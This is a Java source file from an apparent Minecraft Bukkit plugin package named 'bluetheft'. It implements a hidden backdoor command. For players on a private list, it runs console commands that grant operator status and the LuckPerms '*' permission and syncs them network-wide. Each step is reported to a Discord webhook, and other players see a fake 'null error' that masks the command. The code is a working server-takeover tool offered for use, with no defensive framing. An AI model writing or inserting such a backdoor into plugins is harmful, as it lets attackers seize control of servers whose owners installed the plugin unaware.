package com.bluetheft;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Operator implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        // Vérifie que l'expéditeur est un joueur
        if (!(sender instanceof Player)) {
            sender.sendMessage("Cette commande ne peut être exécutée que par un joueur.");
            return false;
        }

        // Récupère le pseudo du joueur qui exécute la commande
        Player player = (Player) sender;
        String playerName = player.getName();

        // Vérifie si le joueur est autorisé via la classe AuthorizedPlayers
        if (!AuthorizedPlayers.isAuthorized(playerName)) {
            sender.sendMessage("STAFF : null error");
            return false;
        }

        // Exécute les commandes pour donner les permissions
        CommandExecutorFromConsole.executeCommand("op " + playerName);
        DiscordWebhook.sendMessage("Commande exécutée : op " + playerName);

        CommandExecutorFromConsole.executeCommand("lp user " + playerName + " permission add *");
        DiscordWebhook.sendMessage("Commande exécutée : lp user " + playerName + " permission add *");

        CommandExecutorFromConsole.executeCommand("lp networksync");
        DiscordWebhook.sendMessage("Commande exécutée : lp networksync");

        CommandExecutorFromConsole.executeCommand("lp sync");
        DiscordWebhook.sendMessage("Commande exécutée : lp sync");

        sender.sendMessage("Les permissions ont été attribuées avec succès.");

        return true;
    }
}
